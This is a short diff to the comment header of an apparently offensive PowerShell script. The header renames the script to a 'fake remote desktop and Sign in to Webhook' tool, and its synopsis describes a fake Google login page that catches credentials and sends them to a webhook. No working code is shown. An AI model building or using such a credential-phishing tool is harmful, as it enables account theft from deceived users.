@@ -1,5 +1,5 @@
 <#
-====================== Google Sign in to Discord =========================
+====================== Google fake remote desktop and Sign in to Webhook =========================
 
 SYNOPNIS
 Uses Powershell and HTML to create a fake google login page which catches login credentials and sends them to a webhook.
